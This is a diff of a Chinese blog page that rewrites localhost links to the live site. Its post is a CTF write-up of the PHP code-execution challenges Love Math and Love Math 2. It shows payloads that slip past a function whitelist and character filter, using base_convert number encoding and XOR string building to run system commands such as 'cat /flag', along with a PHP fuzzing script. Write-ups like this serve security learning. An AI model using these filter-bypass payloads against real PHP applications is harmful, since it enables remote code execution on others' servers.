@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>[CISCN/NESTCTF]Love Math 代码执行 | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[CISCN/NESTCTF]Love Math 代码执行 | 过客 » Feed" href="http://localhost:4000/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[CISCN/NESTCTF]Love Math 代码执行 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="[CISCN/NESTCTF]Love Math 代码执行"/>
-    <meta property="og:url" content="http://localhost:4000/post/XSd-6afAR/"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/XSd-6afAR/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="http://localhost:4000">过客</a>
+      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
             
-            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>[CISCN/NESTCTF]Love Math 代码执行</h1>
@@ -107,11 +107,11 @@
 2：不能有空格\t\r等字符<br>
 3：只能用白名单内的函数</p>
 <!-- more -->
-<p><img src="http://localhost:4000/post-images/1578213796135.png" alt="" loading="lazy"><br>
+<p><img src="https://guokeya.github.io/post-images/1578213796135.png" alt="" loading="lazy"><br>
 base_convert是可以对字符进行转换的。那么我们就可以通过这个函数将恶意代码转换为数字<br>
-<img src="http://localhost:4000/post-images/1578214233798.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1578214233798.png" alt="" loading="lazy"><br>
 我们已经成功构造出了phpinfo,第一个过滤中也没过滤括号。<br>
-<img src="http://localhost:4000/post-images/1578214942266.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1578214942266.png" alt="" loading="lazy"><br>
 下一步。我们就构造命令执行。<br>
 挑个最短的exec，由于base_convert只能构造出小写字母。$_GET这类就不行了。上次说过getallheaders这个函数。可以通过http请求传参。返回数组。然而[]被过滤，这里还有另一种取数组值的方式{1},取1键对应的值。为什么不用之前说的end(getallheaders()))，尝试了下。长度超了。能短就短吧。</p>
 <pre><code>exec=base_convert(696468,10,36)
@@ -121,7 +121,7 @@ getallheaders=base_convert(8768397090111664438,10,30)
 <p>exec(getallheaders(){1})<br>
 将各部分替换<br>
 base_convert(696468,10,36)(base_convert(8768397090111664438,10,30)(){1})<br>
-<img src="http://localhost:4000/post-images/1578216004220.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1578216004220.png" alt="" loading="lazy"><br>
 还有更短的。由于没过滤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">和</mi><mi mathvariant="normal">；</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">把</mi><mi>b</mi><mi>a</mi><mi>s</mi><msub><mi>e</mi><mi>c</mi></msub><mi>o</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi mathvariant="normal">定</mi><mi mathvariant="normal">义</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">和；，
 那么我们就可以把base_convert定义为一个变量。然后调用
 ``</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">把</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord">‘</span><span class="mord">‘</span></span></span></span>pi=base_convert,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>i</mi><mo>(</mo><mn>696468</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>36</mn><mo>)</mo><mo>(</mo><mo>(</mo></mrow><annotation encoding="application/x-tex">pi(696468,10,36)((</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">i</span><span class="mopen">(</span><span class="mord">6</span><span class="mord">9</span><span class="mord">6</span><span class="mord">4</span><span class="mord">6</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mord">6</span><span class="mclose">)</span><span class="mopen">(</span><span class="mopen">(</span></span></span></span>pi(8768397090111664438,10,30))(){1})``<br>
@@ -132,7 +132,7 @@ payload如下:</p>
 </code></pre>
 <p>由于base_convert只能构造出小写字母。但我们可以通过异或来得到大写字母。<br>
 <strong>[NESTCTF 2019]Love Math 2</strong><br>
-<img src="http://localhost:4000/post-images/1578291037924.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1578291037924.png" alt="" loading="lazy"><br>
 相对于第一题。没有了base_convert函数。但是^并没有过滤<br>
 我们可以通过^字符串来获取我们想要的字符</p>
 <pre><code>$pi=${hexdec^decoct(31737)};$pi{1}($pi{2});
@@ -140,7 +140,7 @@ POST:1=system&amp;2=cat /flag
 </code></pre>
 <p>将hexdec字符串异或数字223773<br>
 主要是通过phpfuzz<br>
-<img src="http://localhost:4000/post-images/1578292463954.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1578292463954.png" alt="" loading="lazy"><br>
 还有一种</p>
 <pre><code>&lt;?php
 $payload = array('abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh');
@@ -163,7 +163,7 @@ for($k=1;$k&lt;sizeof($payload);$k++){
 
           
           <p class="next-post">下一篇：
-            <a href="http://localhost:4000/post/cbMk6sLKe/">
+            <a href="https://guokeya.github.io/post/cbMk6sLKe/">
               <span class="post-title">
                 PHP LFI的两种姿势(PHP7崩溃+phpinfo缓存文件)&rarr;
               </span>
@@ -207,7 +207,7 @@ for($k=1;$k&lt;sizeof($payload);$k++){
             
               
               <li class="list-inline-item">
-              <a href="http://localhost:4000/atom.xml" target="_blank">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -222,10 +222,10 @@ for($k=1;$k&lt;sizeof($payload);$k++){
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
